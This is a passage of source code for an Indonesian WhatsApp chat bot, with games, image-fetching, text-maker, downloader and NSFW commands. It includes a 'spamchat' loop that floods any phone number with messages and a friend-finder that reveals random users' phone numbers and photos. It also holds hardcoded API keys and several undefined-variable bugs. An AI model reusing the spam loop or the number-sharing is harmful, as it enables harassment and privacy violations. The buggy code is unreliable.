					setTimeout( () => {
					zacky.sendMessage(from, '_10 Detik lagi_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_20 Detik lagi_', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, '_30 Detik lagi_', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					zacky.sendMessage(from, family, text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
				    case 'tebakgambar':                
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		        if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply('Maaf kamu sudah terbenned!')       
                anu = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${lolkey}`)
				ngebuff = await getBuffer(anu.result.image)
				tebak = `➸ Jawaban : ${anu.result.answer}`
				setTimeout( () => {
				zacky.sendMessage(from, tebak, text, {quoted: mek})
				}, 30000)
				setTimeout( () => {
				zacky.sendMessage(from, '_10 Detik lagi..._', text, {quoted: mek})
				}, 20000)
				setTimeout( () => {
				zacky.sendMessage(from, '_20 Detik lagi..._', text, {quoted: mek})
				}, 10000)
				setTimeout( () => {
				zacky.sendMessage(from, '_30 Detik lagi..._', text, {quoted: mek})
				}, 100)
				setTimeout( () => {
				zacky.sendMessage(from, ngebuff, image, { caption: '_Tebak bro!!! gak bisa jawab ngewe sama gw ya🗿_', quoted: mek})
				}, 0)
				await limitAdd(sender) 
				break
                case 'tebakkata':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		        if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply('Maaf kamu sudah terbenned!')               
				anu = await fetchJson(`https://api.lolhuman.xyz/api/tebak/kata?apikey=${lolkey}`)
				nebaksu = `${anu.result.soal}`
				tebak = `➸ Jawaban : ${anu.result.jawaban}`
				setTimeout( () => {
				zacky.sendMessage(from, tebak, text, {quoted: mek})
				}, 30000)
				setTimeout( () => {
				zacky.sendMessage(from, '_10 Detik lagi..._', text, {quoted: mek})
				}, 20000)
				setTimeout( () => {
				zacky.sendMessage(from, '_20 Detik lagi..._', text, {quoted: mek})
				}, 10000)
				setTimeout( () => {
				zacky.sendMessage(from, '_30 Detik lagi..._', text, {quoted: mek})
				}, 2500)
				setTimeout( () => {
				zacky.sendMessage(from, nebaksu, text, {quoted: mek})
				}, 0)
				await limitAdd(sender) 
				break
					
//=====================================BATES NGAB=====================================\\
//RandomImagemenu
                    // MENU COMMAND SOVIET
					case 'ww2':
					
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=ww2`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
                case 'anjing':
					
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anjing`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break

                case 'kucing':
					
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=kucing`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'doraemon':
					
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=doraemon`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'hamster':
					
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic-hamsters`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
		case 'kelinci':
					
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					zacky.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=aesthetic-rabbit`, {method: 'get'})
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
					//makermenu
                case 'darkneon':
                case 'candlemug':
                case 'lovemsg':
                case 'mugflower':
                case 'narutobanner':
                case 'paperonglass':
                case 'romancetext':
                case 'shadowtext':
                case 'coffeecup':
                case 'coffeecup2':
                case 'glowingneon':
                case 'underwater':
                case 'hpotter':
                case 'woodblock':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} Manik`)
                    manyyikg = args.join(" ")
                    reply(ind.wait())
                    buffer = await getBuffer(`https://videfikri.com/api/textmaker/${command}/?text=${manyyikg}`)
                    zacky.sendMessage(from, buffer, image, {caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL', quoted: mek})
                break
                case 'bakarnama': 				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}anakharamsertiArifi Razzaq*`)
				reply(ind.wait())
				ct = body.slice(11)
				dapuhy = await getBuffer(`http://zekais-api.herokuapp.com/sbburn?text=${ct}`)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL' })
				break
				    case 'nulis': //WORK
				    case 'tulis':
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Manik`)
                dpuhy = args.join(' ')
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/nulis?apikey=${lolkey}&text=${dpuhy}`)
                zacky.sendMessage(from, dapuhy, image, {quoted: freply})
                await limitAdd(sender)
                break
                    
				    case 'nulis1':                
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply(ind.baned())
                if (args.length < 1) return reply(`Teksnya mana ngab?\nContoh ${prefix}nulisArifi Razzaq`)
                dapuhy = body.slice(6)
                reply(ind.wait())
                asu = await getBuffer(`http://zekais-api.herokuapp.com/bukukanan?text=${dapuhy}`)
                zacky.sendMessage(from, asu, image, {caption: 'dont forget to subscribe YouTube Channel Arifi Razzaq OFFICIAL', quoted: mek})
                break
				    case 'nulis2':                 
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply(ind.baned())
                if (args.length < 1) return reply(`Teksnya mana ngab?\nContoh ${prefix}nulisArifi Razzaq`)
                dapuhy = body.slice(7)
                reply(ind.wait())
                asu = await getBuffer(`http://zekais-api.herokuapp.com/bukukiri?text=${dapuhy}`)
                zacky.sendMessage(from, asu, image, {caption: 'dont forget to subscribe YouTube Channel Arifi Razzaq OFFICIAL', quoted: mek})
                break
                case 'nulis3':                
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply(ind.baned())
                if (args.length < 1) return reply(`Teksnya mana ngab?\nContoh ${prefix}nulisArifi Razzaq`)
                dapuhy = body.slice(7)
                reply(ind.wait())
                asu = await getBuffer(`http://zekais-api.herokuapp.com/foliokanan?text=${dapuhy}`)
                zacky.sendMessage(from, asu, image, {caption: 'dont forget to subscribe YouTube Channel Arifi Razzaq OFFICIAL', quoted: mek})
                break
                case 'nulis4':                
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply(ind.baned())
                if (args.length < 1) return reply(`Teksnya mana ngab?\nContoh ${prefix}nulisArifi Razzaq`)
                dapuhy = body.slice(7)
                reply(ind.wait())
                asu = await getBuffer(`http://zekais-api.herokuapp.com/foliokiri?text=${dapuhy}`)
                zacky.sendMessage(from, asu, image, {caption: 'dont forget to subscribe YouTube Channel Arifi Razzaq OFFICIAL', quoted: mek})
                break                
                case 'logogaming':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isLimit(sender)) return reply(ind.limitend(pusname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
if (args.length < 1) return reply(`_Teksnya Mana Boss_\n*Contoh ${prefix}logogaming Manik*`)
game = await getBuffer(`http://docs-jojo.herokuapp.com/api/gaming?text=${body.slice(12)}`)
zacky.sendMessage(from, game, image, {quoted: mek})
break
                case 'gplaybutton':
                case 'splaybutton':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} Manik`)
                    txt = args.join(" ")
                    reply(ind.wait())
                    buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?text=${txt}&apikey=apivinz`)
                    zacky.sendMessage(from, buffer, image, {caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL', quoted: mek})
                    break
         
               case 'qrencode':
                case 'barcode':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} text\nExample: ${prefix + command} Manik`)
                    txt = args.join(" ")
                    reply(ind.wait())
                    buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?apikey=apivinz&text=${txt}`)
                    zacky.sendMessage(from, buffer, image, {caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL', quoted: mek})
                break
                case 'googlesearch':
			    
	        	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
		        if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlesearch Jangan|Lupa|Subscribe`)
				reply(ind.wait())
				ct = body.slice(14)
				dap1 = ct.split("/")[0];
                dap2 = ct.split("/")[1];
				dap3 = ct.split("/")[2];
				anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/textmaker?text=${dap1}&text2=${dap2}&text3=${dap3}&theme=google-suggestion&apikey=dappabotwa`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL' })
				break
				    case 'pubglogo':				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname)) 
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubglogo Manik|Manik`)
				reply(ind.wait())
				ct = body.slice(9)
				dap1 = ct.split("/")[0];
                dap2 = ct.split("/")[1];
				anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/textmaker/game?text=${dap1}&text2=${dap2}&theme=pubg&apikey=dappabotwa`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL' })
				break
				    case 'glitchtext':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}glitchtext Manik|Manik`)
				reply(ind.wait())
				ct = body.slice(11)
				dap1 = ct.split("/")[0];
                dap2 = ct.split("/")[1];
				anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/textmaker?text=${dap1}&text2=${dap2}&theme=glitch&apikey=dappabotwa`)
				dapuhy = await getBuffer(anu.result.url)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL' })
				break
				    case 'cup':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}cupArifi Razzaq`)
				reply(ind.wait())
				ct = body.slice(4)
				anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/textmaker/senja?text=${ct}&theme=coffee-cup&apikey=dappabotwa`)
				dapuhy = await getBuffer(anu.result.url)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL' })
				break
				    case 'cup2':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}cup2Arifi Razzaq`)
				reply(ind.wait())
				ct = body.slice(5)
				anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/textmaker/senja?text=${ct}&theme=coffee-cup2&apikey=dappabotwa`)
				dapuhy = await getBuffer(anu.result.url)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL' })
				break
				    case 'battlefield':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}battlefield Manik|Manik`)
				reply(ind.wait())
				ct = body.slice(12)
				dap1 = ct.split("/")[0];
                dap2 = ct.split("/")[1];
				anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/textmaker/game?text=${dap1}&text2=${dap2}&theme=battlefield&apikey=dappabotwa`)
				dapuhy = await getBuffer(anu.result.url)
				zacky.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'dont forget to subscribe YouTube channel Arifi Razzaq OFFICIAL' })
				break
				    case 'hartatahta':				
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Teksnya Mana Cuy?\nContoh : ${prefix}hartatahta ${pushname}`)
				dapuhy = body.slice(11)
				reply(ind.wait())
				asu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${dapuhy}&apikey=apivinz`)
				zacky.sendMessage(from, asu, image, {quoted: mek})
				await limitAdd(sender)
				break
				
//=====================================BATES NGAB=====================================\\
//ownermenu
                    case 'event':
					if (!isGroup) return reply(ind.groupo())
					if (!isAdmin) return reply('*Only Adminban & Owner Kami!*')
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
						event.push(from)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply(' SUCCSESS  mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply(' SUCCSESS  menonaktifkan fitur event di group ini')
					} else {
						reply(ind.satukos())
					}
					break
case 'spamchat': //CASE BY Manik
if (!isOwner) return reply(ind.ownerb()) 
if (args < 2) return reply(`masukan parameter yang benar\nexampel : ${prefix}spamchat nomertujuan jumblah pesan\ncontoh ${prefix}spamchat 082334297175 10 woi asu`)
nomer = args[0]
jumblah = args[1]
Pesan = args[2]
for ( let i = 0 ; i < jumblah; i++) {
zacky.sendMessage( nomer + '@s.whatsapp.net' , pesan , Text)
}  
break
//nsfwmenu
                case 'randombokep':
                if (!isNsfw) return reply(ind.nsfwoff())
			     zacky.updatePresence(from, Presence.composing) 
				 dappz = fs.readFileSync('./lib/18.js');
                 jsonData = JSON.parse(dappz);
                 babilu = Math.floor(Math.random() * jsonData.length);
                 anjglu = jsonData[babilu];
                 dapbokepp = await getBuffer(anjglu.image)
                 reply(ind.wait())
                 asww = anjglu.teks
                 zacky.sendMessage(from, dapbokepp, image, {quoted: mek, caption: asww})
                 break
                
		        case 'pussy': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/pussy?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'nekonime': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/nekonime?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'baka': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/baka?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'blowjob': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/blowjob?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'lewd': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/lewd?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'hentai': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/hentaigif?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'waifu': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/waifu?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'eroyuri': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/eroyuri?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'hug': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/nsfw/hug?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break
		        case 'hug2': 
		if (!isNsfw) return reply(ind.nsfwoff())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				reply(ind.wait())
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/sfw/hug?apikey=${odcKey}`)
				buffer = await getBuffer(anu.result.url)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih hasilnya kak...'})
				break

case 'cariteman':
//sertakan nama aku jangan claim jangan recode, biarkan kek gini oke! @arifirazzaq2001
//case by Arifi Razzaq
//bug fixed by arifi razzaq
if (isBanned) return reply(mess.only.benned)    
if (!isRegistered) return reply(mess.only.daftarB)
if (isGroup) return  reply( 'Fitur ini tidak bisa dijalankan di dalam grup')
hem = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
await reply('Sedang Mencari Seseorang...')
try {
ppimg = await zacky.getProfilePicture(`${hem.split('@')[0]}@c.us`)
  } catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
  }
  teks = `‣ *Nama* : ${pushname}
  ‣ *Nomor* : ${hem.split("@")[0]}
‣ *APi* : wa.me/${hem.split("@")[0]}?text=halo

Klik APi untuk memulai obrolan`
  its = await getBuffer (ppimg)
  zacky.sendMessage(from, its, image, {
quoted: mek, caption: teks
  })
                await reply( `Seseorang Ditemukan: \n*${prefix}next* — Cari Teman Lagi`)
                await limitAdd(sender)
            break
case 'lanjut':
//kasih kredot gua suh javaica
//Bug Fixed by @arifirazzaq2001 
if (isBanned) return reply(mess.only.benned)    
if (!isRegistered) return reply(mess.only.daftarB)
if (isGroup) return  reply( 'Fitur ini tidak bisa dijalankan di dalam grup')
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply('Sedang Memuat — Mencari Lagi')
				try {
				ppimg = await zacky.getProfilePicture(`${anug.split('@')[0]}@c.us`)
				} catch {
				ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
  teks = `‣ *Nama* : ${pushname}
  ‣ *Nomor* : ${anug.split("@")[0]}
‣ *APi* : wa.me/${anug.split("@")[0]}?text=halo

Klik APi untuk memulai obrolan`
  Ciecie = await getBuffer (ppimg)
  zacky.sendMessage(from, Ciecie, image, {
quoted: mek, caption: teks
  })
                await reply( `Partner found: \n*${prefix}next* — find a new partner`)
				await limitAdd(sender)
				break
				    case 'dompet':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				const kantong = checkATMuser(sender)
				reply(ind.uangkau(pushname, sender, kantong))
				break
				    case 'ytplaymp3':
   case 'ytplaymp4':
if (!isPrem) return reply(ind.premium())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    nikkkkkkkkj = await fetchJson(`https://api.zeks.xyz/api/${command}?apikey=apivinz&q=${query}`)
                    nikkkkkkkkj = nikkkkkkkkj.result
                     nikk =`TITLE = ${nikkkkkkkkj.title}\nSIZE = ${nikkkkkkkkj.size}`
                    gambary = await getBuffer(nikkkkkkkkj.thumbnail)
                    zacky.sendMessage(from, gambary, image, { quoted: mek, caption: nikk })
                    get_audio = await getBuffer(nikkkkkkkkj.url_audio)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${nikkkkkkkkj.title}.mp3`, quoted: mek})
                    get_video = await getBuffer(nikkkkkkkkj.url_video)
                    zacky.sendMessage(from, get_video, video, { mimetype: 'video/mp4', filename: `${nikkkkkkkkj.title}.mp4`, quoted: mek})
                    break
				    case 'joox':
    if (!isPrem) return reply(ind.premium())
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    jooxbyManik = await fetchJson(`https://api.xteam.xyz/dl/jooxdl?lagu=${query}&APIKEY=${xteamkey}`)
                    jooxbyManik = jooxbyzacky.result
                    Manikbot = `Title : ${jooxbyzacky.songname}\nArtists : ${jooxbyzacky.singers}\nDuration : ${jooxbyzacky.duration}\nAlbum : ${jooxbyzacky.album}\nUkuran : ${jooxbyzacky.filesize}\nke : ${jooxbyzacky.ext}\n`
                    thumbnail = await getBuffer(jooxbyzacky.album_url)
                    zacky.sendMessage(from, thumbnail, image, { quoted: mek, caption: Manikbot })
                    get_audio = await getBuffer(jooxbyzacky.download_url)
                    zacky.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${jooxbyzacky.songname}.mp3`, quoted: mek})
                    break
                    case 'suit':
				 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				 suit = await fetchJson(`https://api.xteam.xyz/game/suit?q=${body.slice(6)}&APIKEY=${xteamkey}`, {method: 'get'})
					teks = '=================\n'
					for(i of result){
						teks += `*Punyamu* : ${i.jawabanmu}\n*Punyabot* : ${i.jawabanbot}\n*Hasil* : ${i.hasil}\n*Poin* : ${i.poin}\n=================\n`
					}
					reply(teks)
					break
					case 'aesthetic':
				gatauda = body.slice(9)
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
